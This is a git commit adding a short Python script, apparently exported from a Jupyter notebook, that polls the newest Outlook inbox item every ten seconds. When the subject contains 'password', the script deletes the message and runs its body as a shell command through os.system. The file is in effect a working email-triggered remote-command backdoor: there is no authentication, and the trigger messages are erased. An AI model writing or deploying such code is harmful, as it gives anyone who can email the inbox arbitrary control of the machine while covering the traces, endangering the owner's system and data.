f4d1599c98c31ca8eda0aa5a0e23f2a793d8a31c
Martin Pezous <66411147+LoPezous@users.noreply.github.com>
2021-12-01 16:17:11 +0100

    Add files via upload

---
+++ mail_inputs.py
@@ -0,0 +1,93 @@
+#!/usr/bin/env python
+# coding: utf-8
+
+# In[ ]:
+
+
+
+
+
+# In[ ]:
+
+
+import subprocess
+import win32com.client
+import time
+import os
+def email_inputs():
+    
+    outlook = win32com.client.Dispatch('Outlook.Application')
+    mapi = outlook.GetNamespace("MAPI")
+    inbox = mapi.GetDefaultFolder(6)
+        
+    all_inbox=inbox.Items
+    all_inbox = all_inbox.GetLast()
+    found = False
+    message_subject_to_find = 'password'
+    subject_found = ''
+    
+    
+        
+        
+    if all_inbox.Class == 43:
+        if message_subject_to_find in all_inbox.Subject:
+            subject_found = all_inbox.Subject
+            found = True
+            body = all_inbox.Body
+            all_inbox.delete()
+            return body
+            
+            
+                
+            
+        
+
+
+    
+
+       
+  
+    
+        
+
+while True:  
+    
+    c = email_inputs()
+    if c != None:
+
+        #c = c.split(',')
+
+        
+        c = c.replace('\r\n','')
+        print(c)
+        os.system(str(c))
+    else:
+        print('scanning...')
+        time.sleep(10)
+        pass
+    
+
+            
+            
+    
+
+ 
+
+
+# In[7]:
+
+
+
+
+
+# In[4]:
+
+
+
+
+
+# In[ ]:
+
+
+
+
